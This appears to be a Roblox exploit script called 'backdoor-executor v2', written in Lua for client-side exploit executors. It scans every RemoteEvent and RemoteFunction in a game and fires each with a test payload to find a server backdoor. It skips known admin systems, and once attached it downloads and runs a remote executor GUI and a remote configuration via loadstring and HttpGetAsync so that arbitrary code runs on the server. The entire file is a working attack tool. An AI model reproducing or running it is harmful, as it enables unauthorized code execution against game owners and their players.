-- services
local starterGui = game:GetService("StarterGui")
-- variables
local config
local configRaw = (
	if isfile("bexe-config.lua") then
		readfile("bexe-config.lua")
	else
		game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")
)
local eventInfo = {
	["foundBackdoor"] = false,
	["instance"] = nil,
	["args"] = {"source"},
	["argSrcIndex"] = 1,
	["srcFunc"] = nil
}
local msgOutputs = {
	["attached"] = "\n Attached Event: %s\n Type: %s",
	["printEvent"] = "\n Event: %s\n Type: %s",
	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated."
}
local testSource = [[local daValue=Instance.new("StringValue");daValue.Name,daValue.Parent,daValue.Value=game.PlaceId,workspace,"%s";task.delay(5, daValue.Destroy, daValue)]]
local scannedEvents = table.create(0)
-- functions
local function sendNotification(text)
	return starterGui:SetCore("SendNotification", {
		Title = "[backdoor-executor v2]",
		Text = text,
		Duration = 5
	})
end

local function pathToInstance(strPath)
	local pathSplit = string.split(strPath, ".")
	local result = game

	for _, pathName in pathSplit do
		if not result then return end
		result = result:FindFirstChild(pathName) or nil
	end
	return result
end

local function isRemoteAllowed(object)
	if not object then return end
	local objectPath = object:GetFullName()

	if (not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) or
		table.find(scannedEvents, objectPath) or
		config.blacklistSettings.eventNames[object.Name] or
		(object.Parent and config.blacklistSettings.eventParentNames[object.Parent.Name]) or
		((object.Parent and object.Parent:IsA("ReplicatedStorage") and object:FindFirstChild("__FUNCTION")) or
		(object.Name == "__FUNCTION" and object.Parent:IsA("RemoteEvent") and object.Parent.Parent:IsA("ReplicatedStorage"))) or
		string.find(objectPath, "HDAdminClient") or string.find(objectPath, "Basic Admin Essentials") or
		(object.Parent and object.Parent:IsA("RobloxReplicatedStorage"))
	then
		return false
	end
	return true
end

local function getRemotes()
	local remotes = table.create(500)

	for _, object in game:GetDescendants() do
		if not isRemoteAllowed(object) then continue end
		table.insert(remotes, object)
	end

	if getnilinstances then
		for _, object in getnilinstances() do
			if not isRemoteAllowed(object) then continue end
			table.insert(remotes, object)
		end
	end
	return remotes
end

local function getEventFunc(object)
	return (
		if object:IsA("RemoteEvent") then
			object.FireServer
		elseif object:IsA("RemoteFunction") then
			object.InvokeServer
		else nil
	)
end

local function execScript(source)
	if not eventInfo.foundBackdoor then return end
	local eventFunc = getEventFunc(eventInfo.instance)
	eventInfo.args[eventInfo.argSrcIndex] = (if eventInfo.srcFunc then eventInfo.srcFunc(source) else source)

	task.spawn(eventFunc, eventInfo.instance, unpack(eventInfo.args))
end

local function initializeEventInfo(params)
	if eventInfo.foundBackdoor then return end

	eventInfo.foundBackdoor = true
	for name, value in params do
		eventInfo[name] = value
	end
end

local function onAttached(eventObj, params)
	if not eventObj then return end
	getgenv().__BACKDOOREXEATTACHED = true
	print(string.format(msgOutputs.attached, eventObj:GetFullName(), eventObj.ClassName))
	sendNotification("Attached!")
	initializeEventInfo(params or {
		["instance"] = eventObj,
	})

	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
		customExecution = true,
		executeFunc = execScript,
	})
	for _, scriptSrc in config.autoExec do
		execScript(scriptSrc)
	end
end

local function findBackdoors()
	if eventInfo.foundBackdoor then return end

	for _, object in getRemotes() do
		local eventFunc, objectPath = getEventFunc(object), object:GetFullName()

		print(string.format(msgOutputs.printEvent, object:GetFullName(), object.ClassName))
		pcall(task.spawn, eventFunc, object, string.format(testSource, objectPath))

		local execResult = workspace:FindFirstChild(game.PlaceId)
		if execResult and execResult.Value ~= "" then
			onAttached(pathToInstance(execResult.Value))
			break
		end

		table.insert(scannedEvents, objectPath)
		task.wait()
	end
	table.clear(scannedEvents)
end
-- main
do -- "initialization"?
	if not isfile("bexe-config.lua") then
		writefile("bexe-config.lua", configRaw)
	else
		local succ, loadedConfig = pcall(loadstring(configRaw))

		if (not succ) then
			sendNotification("Local configuration cannot be loaded, overwriting.")
			configRaw = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/backdoor-executor/bexe-config.lua")

			writefile("bexe-config.lua", configRaw)
			loadedConfig = loadstring(configRaw)()
		end
		config = loadedConfig
	end
end
do -- backdoor finding
	if not getgenv().__BACKDOOREXEATTACHED then
		sendNotification("Press F9 to see the remotes being scanned.")
		local placeCacheData = if (typeof(config) == "table" and config.cachedPlaces) then config.cachedPlaces[game.PlaceId] else nil

		if placeCacheData then
			local successCount = 0
			local eventObj = pathToInstance(placeCacheData.Path)
			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))

			successCount += (if typeof(eventObj) == "Instance" then 1 else 0)
			successCount += (if (successCount == 1 and (eventObj:IsA("RemoteEvent") or eventObj:IsA("RemoteFunction"))) then 1 else 0)
			successCount += (if argSrcIndex then 1 else 0)

			if successCount >= 3 then
				onAttached(eventObj, {
					["instance"] = eventObj,
					["srcFunc"] = placeCacheData.SourceFunc,
					["args"] = placeCacheData.Args,
					["argSrcIndex"] = argSrcIndex
				})
			else
				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
			end
		end
		if (not placeCacheData or not eventInfo.foundBackdoor) then -- scan first
			findBackdoors()
		end

		if not eventInfo.foundBackdoor then -- if no backdoor found
			print("No backdoor(s) can be found here!")
			sendNotification("No backdoor(s) can be found here!")
		end
	else
		sendNotification("Already attached!")
	end
end
